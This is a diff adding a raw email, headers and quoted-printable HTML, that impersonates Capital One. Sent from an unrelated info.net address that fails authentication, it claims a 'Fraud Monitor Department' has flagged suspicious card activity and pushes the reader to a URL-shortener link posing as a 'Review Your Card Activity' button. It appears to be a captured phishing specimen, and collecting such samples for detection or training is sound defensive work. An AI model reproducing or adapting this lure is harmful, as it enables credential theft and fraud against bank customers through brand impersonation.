@@ -1,0 +1,332 @@
+Return-Path: <capitalone@info.net>
+Received: from [80.239.179.82] ([80.239.179.82])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id pgca08d45r1gv895fpn6ji8auc9bffa8pa6h2bo1
+ for zingerpie@kfcreview.com;
+ Fri, 26 Sep 2025 08:58:14 +0000 (UTC)
+Received-SPF: none (spfCheck: 80.239.179.82 is neither permitted nor denied by domain of info.net) client-ip=80.239.179.82; envelope-from=capitalone@info.net; helo=[80.239.179.82];
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 80.239.179.82 is neither permitted nor denied by domain of info.net) client-ip=80.239.179.82; envelope-from=capitalone@info.net; helo=[80.239.179.82];
+ dmarc=none header.from=info.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFGR1BjWFhoUHorb3JvYW9YNGJ1aWY2M0lmY0pHOERjN1pRMHA0UGxDTHl4djJpN0lhR3Q1c2o1clA4RnVaT0VaTUhxNFl6ZnRqQnk4U3hwQmUvSUhCQTN6OEY3MnBKV2VWVDBnb3RCTTkvSDNuRmJDUmxyVFl0VWo1MzBZblVUbnRvNHhaRGtyU0Nhb01vUThBcXk3V3JLNXZSZkxydHhEVXFVZE85NjBuS0xNZUVxempiVGMyZlBKRHBBeUhBRThJYnNIUGVvZThic2xYRXVZd25IdllkdGhPQXlDUlFhWFFVdE9hTGtqUWhBa1BZQ0ppK01aQmlIdFFzbERQWHIvR1p0M0N3K1E1TTM2NWJPMkkzRThXRm5OMW5KdDVBSlZ3R3drYUxMb1MvdXc9PQ==
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=TMNkY80N9alNdJEAmscsPTYiebtd9Jx1eqk3qhq5JR/Ds6BrEaKXa5j/AMmEbhfD4018I681yBPy3MeDTOCHdnYNHWF7N2WsZkoOTff4CxGf3aNrg/YLTOAPY5DiO71rNI6WN2eFCHJ9Ei9kMBJvgYL9fdfM1Hn48WLQe/5+d9Q=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1758877094; v=1; bh=4G0dPvAXhZ/ocKD8aPMg/RM+QPMyV+ax1f1QhgKE8cs=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Capital One" <capitalone@info.net>
+To: zingerpie@kfcreview.com
+Subject: Review Suspicious Spending on Your Account
+Date: 26 Sep 2025 10:58:13 +0200
+Message-ID: <20250926105813.FDA79E19541485A6@info.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<table bgcolor=3D"#ffffff" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ class=3D"v1v1darkmode" style=3D"border-collapse: collapse; color: rgb(44, =
+54, 58); font-size: 12px; font-family: Verdana; width: 632px;" width=3D"100=
+%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td style=3D"box-sizing: border-box; padding: 10px 25px;"><img align=3D"=
+middle" alt=3D"Visit Capital One" border=3D"0" class=3D"v1v1lightimg v1v1we=
+bfont" height=3D"35" src=3D"https://ecm.capitalone.com/Messaging/assets/ima=
+ges/global/logo_core_3x.png" style=3D"box-sizing: border-box; vertical-alig=
+n: middle; border-style: none; font-size: 14px; font-family: arial, helveti=
+ca, sans-serif; color: rgb(20, 20, 20); display: block; line-height: 20px; =
+font-variant-numeric: normal; font-variant-east-asian: normal; font-variant=
+-alternates: normal; font-kerning: auto; font-optical-sizing: auto; font-fe=
+ature-settings: normal; font-variation-settings: normal; font-variant-posit=
+ion: normal; font-stretch: normal;" width=3D"98" /></td>
+			<td align=3D"right" style=3D"box-sizing: border-box; padding: 10px 25px;=
+">&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+
+<table bgcolor=3D"#013d5b" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ style=3D"border-collapse: collapse; color: rgb(44, 54, 58); font-size: 12p=
+x; font-family: Verdana;" width=3D"100%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-family: =
+arial, helvetica, sans-serif; color: rgb(255, 255, 255); padding: 20px 25px=
+;">
+			<h1 style=3D"box-sizing: border-box; margin: 0px; font-weight: normal; l=
+ine-height: 26px; font-size: 20px;">Your Capital&nbsp;One<span style=3D"box=
+-sizing: border-box; position: relative; font-size: 13px; line-height: 0px;=
+ vertical-align: baseline; top: -0.5em;">&reg;</span>&nbsp;<span style=3D"b=
+ox-sizing: border-box; font-weight: bolder;">Card Suspicious Spending Activ=
+ity</span></h1>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table bgcolor=3D"#ffffff" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ class=3D"v1v1darkmode" style=3D"border-collapse: collapse; color: rgb(44, =
+54, 58); font-size: 12px; font-family: Verdana;" width=3D"100%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-size: 16=
+px; font-family: arial, helvetica, sans-serif; color: rgb(20, 20, 20); padd=
+ing: 20px 25px; line-height: 22px;">
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 20px;">&nbsp;</p>
+
+			<p align=3D"center" style=3D"box-sizing: border-box; margin-top: 0px; ma=
+rgin-bottom: 0px; font-size: 13pt; font-family: Arial; color: rgb(0, 23, 90=
+);">You have&nbsp;new secure message from&nbsp;Capital&nbsp;One&nbsp;Fraud =
+Monitor Department&nbsp;concerning a suspicious activity on your card<br st=
+yle=3D"box-sizing: border-box;" />
+			<br style=3D"box-sizing: border-box;" />
+			<font size=3D"4" style=3D"box-sizing: border-box;">Follow the prompt bel=
+ow if you recognize the activity on your card and review your card activity=
+</font></p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table bgcolor=3D"#ffffff" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ class=3D"v1v1darkmode" style=3D"border-collapse: collapse; color: rgb(44, =
+54, 58); font-size: 12px; font-family: Verdana;" width=3D"100%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td style=3D"box-sizing: border-box; font-size: 0px; padding: 0px 25px 1=
+0px; text-align: center;">
+			<div class=3D"v1v1cssbutton" style=3D"box-sizing: border-box; max-width:=
+ 300px; width: 300px; vertical-align: top; display: inline-block;">
+			<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" style=3D"border-=
+collapse: collapse;" width=3D"100%">
+				<tbody style=3D"box-sizing: border-box;">
+					<tr style=3D"box-sizing: border-box;">
+						<td style=3D"box-sizing: border-box; height: 48px;">
+						<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" style=3D"bord=
+er-collapse: collapse;" width=3D"100%">
+							<tbody style=3D"box-sizing: border-box;">
+								<tr style=3D"box-sizing: border-box;">
+									<td bgcolor=3D"#25810e" height=3D"48" style=3D"box-sizing: border-=
+box;">
+									<p align=3D"center" style=3D"box-sizing: border-box; margin-top: 0=
+px; margin-bottom: 1rem;"><a class=3D"v1v1webfont" href=3D"https://fli.so/c=
+alm-week-991" rel=3D"noreferrer" style=3D"box-sizing: border-box; color: rg=
+b(255, 255, 255); text-decoration-line: none; background-color: transparent=
+; font-size: 20px; border-width: medium; border-style: none; border-color: =
+initial; height: 48px; font-family: arial, helvetica, sans-serif; width: 46=
+2px; min-width: 300px; display: inline-block; line-height: 48px; font-varia=
+nt-numeric: normal; font-variant-east-asian: normal; font-variant-alternate=
+s: normal; font-kerning: auto; font-optical-sizing: auto; font-feature-sett=
+ings: normal; font-variation-settings: normal; font-variant-position: norma=
+l; font-stretch: normal;" target=3D"_blank">Review Your Card Activity</a></=
+p>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</div>
+
+			<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem=
+;">&nbsp;</p>
+
+			<p style=3D"box-sizing: border-box; margin-top: 0px; margin-bottom: 1rem=
+;">&nbsp;</p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table bgcolor=3D"#ffffff" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ class=3D"v1v1darkmode" style=3D"border-collapse: collapse; color: rgb(44, =
+54, 58); font-size: 12px; font-family: Verdana;" width=3D"100%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-size: 16=
+px; font-family: arial, helvetica, sans-serif; color: rgb(20, 20, 20); padd=
+ing: 20px 25px; line-height: 22px;">
+			<p align=3D"center" style=3D"box-sizing: border-box; margin-top: 0px; ma=
+rgin-bottom: 0px; font-size: 13pt; font-family: Arial; color: rgb(0, 23, 90=
+);">Your account security is important to us. We&nbsp;are sorry for any inc=
+onviniences.&nbsp;</p>
+
+			<p align=3D"center" style=3D"box-sizing: border-box; margin-top: 0px; ma=
+rgin-bottom: 0px; font-size: 13pt; font-family: Arial; color: rgb(0, 23, 90=
+);">&nbsp;</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px;">&nbsp;</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px;">Thanks for choosing Ca=
+pital&nbsp;One.</p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table bgcolor=3D"#ffffff" border=3D"0" cellpadding=3D"0" cellspacing=3D"0"=
+ class=3D"v1v1darkmode" style=3D"border-collapse: collapse; color: rgb(44, =
+54, 58); font-size: 12px; font-family: Verdana;" width=3D"100%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td align=3D"center" style=3D"box-sizing: border-box; font-size: 0px; he=
+ight: 1px; width: 582px; padding: 0px 25px; line-height: 1px; max-height: 1=
+px;">
+			<div style=3D"box-sizing: border-box; height: 1px; width: 582px; border-=
+bottom: 1px solid rgb(212, 212, 212);">&nbsp;</div>
+			</td>
+		</tr>
+		<tr style=3D"box-sizing: border-box;">
+			<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-size: 16=
+px; font-family: arial, helvetica, sans-serif; color: rgb(20, 20, 20); padd=
+ing: 20px 25px; line-height: 22px;">
+			<p style=3D"box-sizing: border-box; margin: 0px;"><span style=3D"box-siz=
+ing: border-box; font-weight: bolder;">Was this alert helpful?</span>&nbsp;=
+Tell us what you think in one click.</p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" class=3D"v1v1footer=
+" style=3D"border-collapse: collapse; color: rgb(44, 54, 58); font-size: 12=
+px; font-family: Verdana; background-color: rgb(244, 244, 244);" width=3D"1=
+00%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td style=3D"box-sizing: border-box; border-bottom: 1px solid rgb(212, 2=
+12, 212); padding: 20px 25px;">
+			<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" style=3D"border-=
+collapse: collapse;" width=3D"100%">
+				<tbody style=3D"box-sizing: border-box;">
+					<tr style=3D"box-sizing: border-box;">
+						<td style=3D"box-sizing: border-box;" width=3D"50"><a href=3D"https:/=
+/fli.so/calm-week-991" rel=3D"noreferrer" style=3D"box-sizing: border-box; =
+color: rgb(0, 172, 255); text-decoration-line: none; background-color: tran=
+sparent; display: block;" target=3D"_blank"><img alt=3D"Download the Capita=
+l One Mobile app" border=3D"0" class=3D"v1v1webfont" height=3D"27" src=3D"h=
+ttps://ecm.capitalone.com/Messaging/assets/images/global/iconsoc_mb_3x.png"=
+ style=3D"box-sizing: border-box; vertical-align: middle; border-style: non=
+e; font-size: 10px; font-family: arial, helvetica, sans-serif; color: rgb(1=
+03, 104, 104); display: block; line-height: 12px; font-variant-numeric: nor=
+mal; font-variant-east-asian: normal; font-variant-alternates: normal; font=
+-kerning: auto; font-optical-sizing: auto; font-feature-settings: normal; f=
+ont-variation-settings: normal; font-variant-position: normal; font-stretch=
+: normal;" width=3D"27" /></a></td>
+						<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-famil=
+y: arial, helvetica, sans-serif; color: rgb(103, 104, 104); line-height: 16=
+px;"><span class=3D"v1v1textLink" style=3D"box-sizing: border-box; border-b=
+ottom: 1px solid rgb(103, 104, 104); padding-bottom: 1px;">Download the Cap=
+ital&nbsp;One Mobile app.</span></td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" class=3D"v1v1footer=
+" style=3D"border-collapse: collapse; color: rgb(44, 54, 58); font-size: 12=
+px; font-family: Verdana; background-color: rgb(244, 244, 244);" width=3D"1=
+00%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-size: 10=
+px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; =
+color: rgb(105, 105, 105); padding: 24px; line-height: 16px; font-variant-n=
+umeric: normal; font-variant-east-asian: normal; font-variant-alternates: n=
+ormal; font-kerning: auto; font-optical-sizing: auto; font-feature-settings=
+: normal; font-variation-settings: normal; font-variant-position: normal; f=
+ont-stretch: normal;">
+			<h2 style=3D"box-sizing: border-box; margin: 0px 0px 16px; line-height: =
+16px; font-size: 10px;">About this message</h2>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">Web access is=
+ needed to use mobile banking. Check with your service provider for det<spa=
+n style=3D"box-sizing: border-box;">Unlink</span>ails on specific fees and =
+charges.</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">The site may =
+be unavailable during normal maintenance or due to unforeseen circumstances=
+=2E</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px;"><span class=3D"v1v1tex=
+tLink" style=3D"box-sizing: border-box; border-bottom: 1px solid; padding-b=
+ottom: 1px;">Please visit our Set Alerts page</span>&nbsp;to modify your al=
+erts subscription preferences.</p>
+			</td>
+		</tr>
+		<tr style=3D"box-sizing: border-box;">
+			<td style=3D"box-sizing: border-box; font-size: 0px; height: 1px; paddin=
+g: 0px 24px; line-height: 0;">
+			<div style=3D"box-sizing: border-box; border-bottom: 1px solid rgb(125, =
+125, 125);">&nbsp;</div>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" class=3D"v1v1footer=
+" style=3D"border-collapse: collapse; color: rgb(44, 54, 58); font-size: 12=
+px; font-family: Verdana; background-color: rgb(244, 244, 244);" width=3D"1=
+00%">
+	<tbody style=3D"box-sizing: border-box;">
+		<tr style=3D"box-sizing: border-box;">
+			<td class=3D"v1v1webfont" style=3D"box-sizing: border-box; font-size: 10=
+px; font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; =
+color: rgb(105, 105, 105); padding: 24px; line-height: 16px; font-variant-n=
+umeric: normal; font-variant-east-asian: normal; font-variant-alternates: n=
+ormal; font-kerning: auto; font-optical-sizing: auto; font-feature-settings=
+: normal; font-variation-settings: normal; font-variant-position: normal; f=
+ont-stretch: normal;">
+			<h2 style=3D"box-sizing: border-box; margin: 0px 0px 16px; line-height: =
+16px; font-size: 10px;">Important information from Capital&nbsp;One</h2>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;"><span class=
+=3D"v1v1com-tran" style=3D"box-sizing: border-box;"><span class=3D"v1v1text=
+Link" style=3D"box-sizing: border-box; border-bottom: 1px solid; padding-bo=
+ttom: 1px;">Contact us</span>&nbsp;&nbsp;|&nbsp;&nbsp;<span class=3D"v1v1te=
+xtLink" style=3D"box-sizing: border-box; border-bottom: 1px solid; padding-=
+bottom: 1px;">Privacy</span>&nbsp;&nbsp;|&nbsp;&nbsp;<span class=3D"v1v1tex=
+tLink" style=3D"box-sizing: border-box; border-bottom: 1px solid; padding-b=
+ottom: 1px;">&nbsp;Help prevent fraud</span></span></p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">To ensure del=
+ivery, add&nbsp;<a rel=3D"noreferrer" style=3D"box-sizing: border-box; back=
+ground-color: transparent;">capitalone@notification.capitalone.com</a>&nbsp=
+;to your address book.</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;"><span class=
+=3D"v1v1com-tran" style=3D"box-sizing: border-box;">This email was sent to =
+info@ecdconnections.com&nbsp;and contains information directly related to y=
+our account with us, other services to which you have subscribed, and/or an=
+y application you may have submitted.</span></p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">Capital One d=
+oes not provide, endorse or guarantee any third-party product, service, inf=
+ormation or recommendation listed above. The third parties listed are not a=
+ffiliated with Capital&nbsp;One and are solely responsible for their produc=
+ts and services. All trademarks are the property of their respective owners=
+=2E</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">Please do not=
+ reply to this message, as this email inbox is not monitored.&nbsp;<span cl=
+ass=3D"v1v1textLink" style=3D"box-sizing: border-box; border-bottom: 1px so=
+lid; padding-bottom: 1px;">To contact us, visit www.capitalone.com/help-cen=
+ter/contact-us.</span></p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">Products and =
+services are offered by Capital&nbsp;One, N.A.</p>
+
+			<p style=3D"box-sizing: border-box; margin: 0px 0px 16px;">&copy; 2024 C=
+apital&nbsp;One. Capital&nbsp;One is a federally registered service mark.</=
+p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+</body>
+</html>
